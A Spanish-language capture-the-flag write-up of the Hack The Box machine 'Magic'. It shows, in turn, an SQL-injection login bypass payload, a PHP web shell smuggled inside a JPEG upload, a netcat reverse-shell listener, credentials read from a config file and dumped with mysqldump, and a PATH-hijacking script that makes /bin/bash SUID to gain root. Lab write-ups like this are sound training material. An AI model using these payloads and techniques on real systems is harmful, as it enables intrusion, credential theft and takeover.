---
title: Magic - Medium (HTB)
tags:
permalink: /Magic-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
nmap -sCV -p22,80 10.129.235.62                             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-17 13:07 EST
Nmap scan report for 10.129.235.62
Host is up (0.50s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.44 seconds

```

## Website 

La web inicial no muestra nada de nada, solo muchas imagenes.

![image-center](/assets/images/Pasted image 20251217150809.png)

## Login page

En el panel de login no puedo escribir con espacios.

![image-center](/assets/images/Pasted image 20251217150951.png)
### SQL Injection

Sin embargo copie el siguiente `payload` en mi consola y lo copie en el campo `username`.

```sql
' or 1=1-- -'
```

![image-center](/assets/images/Pasted image 20251217152600.png)

Y pude `bypassear` el panel de login.
## Upload bypass.

![image-center](/assets/images/Pasted image 20251217164403.png)
## Shell as www-data

Una vez logueado en la pagina veo que tengo la posibilidad de subir una imagen, sin embargo si uso los tipicos metodos de Bypass para estos paneles, intento ver el comportamiento de la pagina al ver cuando un archivo es valido.

![image-center](/assets/images/Pasted image 20251217164512.png)

Intercepte la petición de la subida de un archivo `php` con el siguiente contenido.

```bash
<?php
	system($_GET['cmd']);
?>
```

Pero me sale el siguiente mensaje de error al intentar usar dobles extensiones.

![image-center](/assets/images/Pasted image 20251217164652.png)
## Bypass

Por lo que dentro de la imagen `jpeg` que subí antes, coloque el mismo código `php` dentro de la misma, por lo que quedo asi.

![image-center](/assets/images/Pasted image 20251217164823.png)
### Shell

Ya después la subí, y como el archivo se sube en la ruta `/images/uploads` ahí esta, por lo que me envíe una shell a mi maquina.

![image-center](/assets/images/Pasted image 20251217160547.png)

Y desde mi listener recibí la conexión.

```bash
 nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.235.62] 46174
whoami
www-data
```
## Shell as theseus

Enumerando el sistema veo que solo hay un usuario.

```bash
www-data@magic:/var/www/Magic$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
theseus:x:1000:1000:Theseus,,,:/home/theseus:/bin/bash
<SNIP>
```
### Database file
Además en la ruta `/var/www/Magic` hay un archivo de base de datos de `MySQL` con unas credenciales, que desafortunadamente no son validas para el usuario `theseus`.

```bash
www-data@magic:/var/www/Magic$ cat db.php5 
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';
<SNIP>
```

Como `mysql` no esta instalado en la maquina, fui hasta la ruta `/usr/bin` y vi el binario de `mysqldump`, por lo que tiene un uso igual, por lo que use las credenciales que tengo para dumpear los datos de la base de datos con el siguiente comando:

```bash
mysqldump -u theseus -p'iamkingtheseus' Magic > magic_dump.sql
```
### Credentials

Viendo el resultado del dumpeo, vi una credenciales.

```bash
www-data@magic:/var/www/Magic$ cat magic_dump.sql
<SNIP>
/*!40000 ALTER TABLE `login` DISABLE KEYS */;
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
/*!40000 ALTER TABLE `login` ENABLE KEYS */;
<SNIP>
```
### Auth

Las mismas son validas para el usuarios `theseus`

```bash
www-data@magic:/var/www/Magic$ su theseus
Password: 
theseus@magic:/var/www/Magic$ 
```

```bash
theseus@magic:~$ cat user.txt 
a4778f8cf8dd6aa230bdfb7fb6edd12a
```
## Shell as root

Como el usuario es parte del grupo `users`, use este comando para buscar binarios `SUID` de los cuales este grupo sea propietario.

```bash
theseus@magic:/tmp$ id
uid=1000(theseus) gid=1000(theseus) groups=1000(theseus),100(users)
theseus@magic:/tmp$ find / -group users 2>/dev/null 
/bin/sysinfo
```
## PATH Hijacking

Viendo las cadenas legibles de este binario, vi que es vulnerable a `Path Hijacking`, ya que el mismo usa alguna herramientas como `free`, `lshw`, `fdisk` con la ruta relativa, y lo la absoluta como `/usr/bin/lshw` por ejemplo.

```bash
theseus@magic:/tmp$ strings /bin/sysinfo
<SNIP>
popen() failed!
====================Hardware Info====================
lshw -short
====================Disk Info====================
fdisk -l
====================CPU Info====================
cat /proc/cpuinfo
====================MEM Usage=====================
free -h

```

Por lo que me cree un script en `bash` el cual se va a usar cuando ejecute el binario, ya que como no usa la ruta absoluta, va a buscar el binario desde el `PATH`.
```bash
theseus@magic:/tmp$ cat lshw 
#!/bin/bash
chmod u+s /bin/bash
```
### Export PATH

Por lo que puedo exportar el PATH al directorio `tmp`, por ende cuando ejecute el binario, el mismo va a buscar `lshw` desde el `PATH`, empezando por el directorio `/tmp`.
Para exportar el PATH use el siguiente comando.

```bash
theseus@magic:/tmp$ PATH=/tmp:$PATH
```

Ahora puedo pasar a verificar los permisos de la `bash`.

```bash
theseus@magic:/tmp$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
```

Y ahora ejecuto el binario.

```bash
theseus@magic:/tmp$ /bin/sysinfo
====================Hardware Info====================

====================Disk Info====================
Disk /dev/loop0: 91.4 MiB, 95805440 bytes, 187120 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/loop1: 548 KiB, 561152 bytes, 1096 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
<SNIP>
```
### Shell
Y efectivamente el binario ejecuto mi script, por lo que el bit `SUID` se le asigno a la `bash`.

```bash
theseus@magic:/tmp$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
```

Ahora puedo convertirme en `root`.

```bash
theseus@magic:/tmp$ bash -p
bash-4.4# whoami
root
```

```bash
bash-4.4# cat /root/root.txt
ff12ce57e7ba969554673a1de2318716
```

`~Happy Hacking.`